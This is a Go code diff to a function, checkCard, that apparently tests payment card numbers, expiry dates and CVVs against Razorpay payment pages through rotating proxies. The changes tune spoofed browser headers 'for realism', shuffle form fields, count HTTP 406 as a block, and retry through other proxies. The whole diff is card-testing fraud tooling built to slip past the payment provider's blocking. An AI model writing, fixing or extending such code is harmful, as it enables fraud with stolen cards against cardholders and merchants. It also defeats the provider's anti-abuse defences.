@@ -2023,21 +2023,21 @@ func checkCard(ctx context.Context, cc, mm, yy, cvv string, pp *parsedProxy, tar
 	form7["dcc_currency"] = []string{orderCurrency}
 
 	// FIX 6: REALISTIC PAYMENT HEADERS - Use payment page origin, not API
+	// NOTE: The payment create endpoint returns JSON. Sending Accept: text/html
+	// causes HTTP 406 Not Acceptable on some Razorpay servers. Use the same
+	// Accept header as DoFetch's default (which works for all other steps).
+	// Also do NOT include "br" in Accept-Encoding — Go stdlib has no Brotli
+	// decoder.
 	paymentHeaders := map[string]string{
-		"Content-Type":     "application/x-www-form-urlencoded",
-		"Origin":           "https://pages.razorpay.com", // FIX: Payment page origin
-		"Referer":          targetURL,                    // FIX: Actual payment page URL
-		"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"Accept-Language":  generateAcceptLanguage(),
-		"Accept-Encoding":  "gzip, deflate, br",
-		"Cache-Control":    "max-age=0",
-		"Pragma":           "no-cache",
-		"DNT":              "1",
-		"Connection":       "keep-alive",
-		"X-Requested-With": "XMLHttpRequest",
-		"Sec-Fetch-Site":   "same-site",
-		"Sec-Fetch-Mode":   "cors",
-		"Sec-Fetch-Dest":   "empty",
+		"Content-Type":    "application/x-www-form-urlencoded",
+		"Origin":          "https://pages.razorpay.com",
+		"Referer":         targetURL,
+		"Accept":          "*/*", // FIX: was text/html — caused HTTP 406
+		"Accept-Language": generateAcceptLanguage(),
+		"Accept-Encoding": "gzip, deflate", // FIX: removed "br" — Go can't decode Brotli
+		"Sec-Fetch-Site":  "same-site",
+		"Sec-Fetch-Mode":  "cors",
+		"Sec-Fetch-Dest":  "empty",
 	}
 
 	// FIX 7: Shuffle form fields for realism
@@ -2060,7 +2060,7 @@ func checkCard(ctx context.Context, cc, mm, yy, cvv string, pp *parsedProxy, tar
 	// was skipped (no proxies / same proxy / build error), `r7` is still
 	// the original 403 response — we MUST return BLOCKED instead of
 	// trying to parse gzip/HTML as JSON.
-	if r7.StatusCode == 403 || r7.StatusCode == 429 {
+	if r7.StatusCode == 403 || r7.StatusCode == 429 || r7.StatusCode == 406 {
 		bodyPreview := r7.Text()
 		if len(bodyPreview) > 150 {
 			bodyPreview = bodyPreview[:150] + "..."
@@ -2096,7 +2096,7 @@ func checkCard(ctx context.Context, cc, mm, yy, cvv string, pp *parsedProxy, tar
 				log.Printf("retry %d: PostForm error: %v", retryAttempt, rerr)
 				continue
 			}
-			if r7b.StatusCode == 403 || r7b.StatusCode == 429 {
+			if r7b.StatusCode == 403 || r7b.StatusCode == 429 || r7b.StatusCode == 406 {
 				log.Printf("retry %d: still blocked (HTTP %d)", retryAttempt, r7b.StatusCode)
 				continue
 			}
@@ -2114,6 +2114,8 @@ func checkCard(ctx context.Context, cc, mm, yy, cvv string, pp *parsedProxy, tar
 	var r7Data map[string]interface{}
 	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
 		body := strings.TrimSpace(r7.Text())
+		log.Printf("[r7-debug] parse failed. HTTP %d, body length %d, first 200 bytes: %q",
+			r7.StatusCode, len(body), truncate(body, 200))
 		if len(body) > 120 {
 			body = body[:120] + "..."
 		}
